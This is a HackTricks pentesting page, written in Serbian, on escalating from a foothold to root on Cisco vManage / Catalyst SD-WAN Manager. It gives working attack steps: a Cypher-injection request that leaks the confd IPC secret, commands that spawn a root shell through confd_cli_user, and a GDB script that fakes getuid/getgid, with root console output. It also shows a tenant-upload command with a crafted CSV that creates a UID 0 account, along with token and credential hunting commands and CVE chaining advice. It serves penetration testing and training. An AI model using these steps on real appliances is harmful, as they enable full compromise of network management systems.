# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Kada dobijete code execution na Cisco vManage / *Catalyst SD-WAN Manager* kao `vmanage`, `netadmin` ili `vmanage-admin`, najzanimljivije lokalne privesc površine su obično `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs i root-owned import/upload handlers.

Ako vam i dalje treba **initial foothold** na controller-u, prvo pogledajte dedicated control-plane stranicu:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ako je `/etc/confd/confd_ipc_secret` čitljiv sa tvog foothold-a, Path 1 i Path 2 odmah postaju praktični. Ako si došao preko remote info leak-a ili webshell-a, proveri i da li već možeš da dođeš do `vmanage-admin` SSH materijala ili multitenancy upload handler-a: istraživanje iz 2026. pokazalo je da su oba bila realistični stepenici.

## Path 1

(Primer iz [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nakon što smo malo prekopali kroz neku [documentation](http://66.218.245.39/doc/html/rn03re18.html) povezanu sa `confd` i različitim binarnim fajlovima (dostupno sa nalogom na Cisco website), otkrili smo da za autentikaciju IPC socket-a koristi secret koji se nalazi u `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Sećate li se naše Neo4j instance? Ona se pokreće sa privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo datoteku koristeći prethodnu ranjivost:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Program `confd_cli` ne podržava command line arguments, ali poziva `/usr/bin/confd_cli_user` sa argumentima. Zato možemo direktno da pozovemo `/usr/bin/confd_cli_user` sa sopstvenim skupom argumenata. Međutim, on nije čitljiv sa našim trenutnim privilegijama, pa moramo da ga preuzmemo iz rootfs i kopiramo koristeći scp, pročitamo help, i iskoristimo ga da dobijemo shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Primer iz [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ od synacktiv tima opisuje elegantan način da se dobije root shell, ali kvaka je u tome što zahteva dobijanje kopije `/usr/bin/confd_cli_user`, koja je čitljiva samo za root. Našao sam drugi način da eskaliram do root bez takve muke.

Kada sam disasemblirao `/usr/bin/confd_cli` binary, primetio sam sledeće:

<details>
<summary>Objdump pokazuje prikupljanje UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Kada pokrenem “ps aux”, uočio sam sledeće (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Pretpostavio sam da program “confd_cli” prosleđuje korisnički ID i grupni ID koje je prikupio od prijavljenog korisnika aplikaciji “cmdptywrapper”.

Moj prvi pokušaj bio je da pokrenem “cmdptywrapper” direktno i da mu prosledim `-g 0 -u 0`, ali nije uspelo. Izgleda da je negde usput kreiran deskriptor datoteke (-i 1015) i ne mogu da ga lažiram.

Kao što je pomenuto u synacktiv-ovom blogu(poslednji primer), program “confd_cli” ne podržava komandne argumente, ali mogu da utičem na njega pomoću debagera i, srećom, GDB je instaliran na sistemu.

Napravio sam GDB skript u kome sam naterao API `getuid` i `getgid` da vraćaju 0. Pošto već imam “vmanage” privilegiju kroz deserialization RCE, imam dozvolu da direktno pročitam `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Putanja 3 (2025 CLI bug pri validaciji ulaza - CVE-2025-20122)

Cisco je kasnije dokumentovao čistiju lokalnu root putanju u svom advisory-ju za [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **autentifikovani napadač sa samo read-only privilegijama** mogao je da pošalje posebno izrađen zahtev manager CLI-ju i dobije root zbog nedovoljne validacije ulaza.

Iz ofanzivne perspektive, ovo je važan zaključak:

1. Kada jednom imaš *bilo kakvo* uporište sa niskim privilegijama na mašini, treba da testiraš lokalni CLI servis pre nego što kreneš na teži Path 1 / Path 2 workflow.
2. Ponovo iskoristi artefakte iz Path 2 da pronađeš granicu poverenja: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Svako polje prosleđeno CLI backend-u tretiraj kao sumnjivo: UID/GID, korisničko ime, terminal metadata, importovane fajlove ili bilo koju vrednost koju kasnije koristi helper sa root vlasništvom.
4. Ako low-priv korisnik može da dođe do lokalnog CLI socket-a i utiče na ta polja, root može biti udaljen samo jedan posebno izrađen zahtev.

Praktičan workflow nakon što se dođe do appliance-a je:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Ovo pretvara bug iz 2025. u dobar hunting pattern za slične verzije: traži **local CLI shims that collect identity in userland and forward it to a more privileged wrapper**.

Nemoj da pomešaš **CVE-2025-20122** sa kasnijim **CVE-2026-20122**: problem iz 2025. je *local* CLI-to-root bug, dok je problem iz 2026. *remote* API arbitrary file overwrite koji je uglavnom koristan za postavljanje foothold-a, a zatim ponovni prolazak kroz Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco-ov savet iz februara 2026. je takođe uveo još jednu korisnu privesc klasu: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) je omogućavao **authenticated, local attacker with low privileges** da dobije root zbog nedovoljnog user-authentication mehanizma u REST API-ju.

Ovo je važno zato što vManage privesc više nije ograničen samo na `confd`/TTY abuse. Posle low-priv shell-a, takođe traži:

- localhost-only API endpoints koji previše veruju caller-u
- token-e, cookie-je ili service credentials koji se mogu pročitati iz trenutnog naloga
- root-only akcije izložene kroz `dataservice`/REST handlers koje se i dalje mogu lokalno pokrenuti

U praksi, kada jednom dobiješ shell kao `vmanage` ili kao drugi service user, local API abuse je često tiši i lakši za automatizaciju nego interaktivni CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ako je lokalni session context dovoljan da se pogodi privileged REST funkcionalnost, preferiraj API path: lakše ga je replay, script, i chain sa stolen web sessions ili API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Još jedan nedavni pattern je [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): lokalni attacker sa `netadmin` privilegijama mogao je da uploaduje **crafted file** koji je CLI kasnije nesigurno obradio, što je dovodilo do command injection kao `root`.

Sa HackTricks stanovišta, vredna tehnika je šira od konkretnog CVE-a:

1. Enumeriši svaki CLI ili web workflow koji prihvata file: imports, diagnostic bundles, templates, validators, backups, tenant data, itd.
2. Prati gde uploadovani file završava i koji root-owned script ili binary ga koristi.
3. Testiraj da li se filename, file content, ili parsed metadata ikada prosleđuju shell komandama, wrapper scripts, ili `system()`-style helperima.
4. Ako već možeš da dođeš do `netadmin` (valid creds, stolen session, ili auth-bypass chain), file-processing bugs su često najbrži put do root.

Google Cloud / Mandiant je kasnije pokazao veoma konkretan primer ovog bug class-a iskorišćenog kroz multitenancy import path:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
U posmatranom napadu, izrađeni CSV je na kraju izmenio `/etc/passwd` i `/etc/shadow` kako bi kreirao privremeni UID 0 nalog (`troot`). To čini `tenant-upload` / `tenant-list` stil importera posebno zanimljivim: oni nisu samo funkcije za unos podataka, već potencijalni parser front-endovi u vlasništvu root-a.

Brz shell-side hunting pattern je:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ova klasa buga posebno dobro funkcioniše zajedno sa remote footholds koji daju `netadmin`, ali ne i `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Unauthenticated info leak (CVE-2026-20133)** – Posebno visoke vrednosti jer je javno istraživanje pokazalo da može otkriti `confd_ipc_secret` ili privatni ključ `vmanage-admin`, pretvarajući read bug u ili Path 1 ili NETCONF pivot.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Različito od 2025 CLI buga iznad; VulnCheck ga je koristio za upload webshell-a, što onda čini lokalne privesc putanje na ovoj stranici odmah relevantnim.
- **Authenticated UI XSS (CVE-2024-20475)** – Ukradi admin sesiju u web UI, zatim pivotuj u API/CLI akcije koje na kraju dovode do `vshell` ili jedne od lokalnih privesc putanja iznad.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Veoma jak prethodnik za Path 5 jer je `netadmin` tačno nivo potreban za 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Slična ofanzivna vrednost kao CVE-2026-20122, ali kroz kasniju web UI upload putanju: upiši u lokaciju koja će kasnije biti parsirana od strane root ili od strane management-plane web sloja.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions su pokazale da napadači mogu da se vrate na stariju ranjivu SD-WAN verziju, zloupotrebe stari CLI root bug, a zatim vrate originalnu verziju.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Bolje dokumentovano na namenskoj SD-WAN control-plane stranici; može da doda SSH ključ za `vmanage-admin`, dajući ti lokalni foothold potreban da ponovo posetiš ovu stranicu.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
